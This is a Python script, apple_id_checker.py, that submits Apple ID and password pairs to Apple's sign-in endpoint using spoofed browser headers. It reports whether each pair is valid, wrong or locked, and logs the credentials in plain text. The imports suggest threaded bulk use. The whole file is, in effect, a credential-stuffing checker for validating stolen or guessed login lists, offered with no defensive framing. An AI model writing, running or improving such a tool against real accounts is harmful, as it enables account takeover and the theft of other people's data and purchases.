# apple_id_checker.py

import requests
from threading import Lock
from time import sleep
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Constants
URL = 'https://idmsa.apple.com/appleauth/auth/signin'
HEADERS = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "X-Apple-Locale": "QT-EN",
    "X-Apple-Trusted-Domain": "https://idmsa.apple.com",
    "Origin": "https://idmsa.apple.com",
    "X-Requested-With": "XMLHttpRequest"
}
PASSWORD_CORRECT_MESSAGE = 'authType'
CLOSED_ACCOUNT_MESSAGE = 'This Apple ID has been locked for security reasons.'
PASSWORD_INCORRECT_MESSAGE = 'Your Apple ID or password was incorrect.'

# Lock for thread safety
lock = Lock()

class AppleIDChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(HEADERS)

    def try_login(self, apple_id, password):
        try:
            response = self.session.post(URL, json={"accountName": apple_id, "password": password, "rememberMe": False})
            return self.process_response(apple_id, password, response.text)
        except requests.RequestException as e:
            logger.error(f'HTTP错误: {e}')
            return {"error": "尝试登录时发生HTTP错误。"}

    def process_response(self, apple_id, password, response_text):
        if PASSWORD_CORRECT_MESSAGE in response_text:
            logger.info(f'密码正确 AppleID -> {apple_id}:{password}')
            return {"message": "帐号密码正确。"}
        elif PASSWORD_INCORRECT_MESSAGE in response_text:
            logger.info(f'密码错误 AppleID -> {apple_id}:{password}')
            return {"message": "帐号密码错误。"}
        elif CLOSED_ACCOUNT_MESSAGE in response_text:
            logger.info(f'账户已锁定 AppleID -> {apple_id}:{password}')
            return {"message": "该Apple ID因安全原因已被锁定。"}
        else:
            logger.error(f'错误-> {apple_id}:{password}')
            return {"error": "发生未知错误。"}
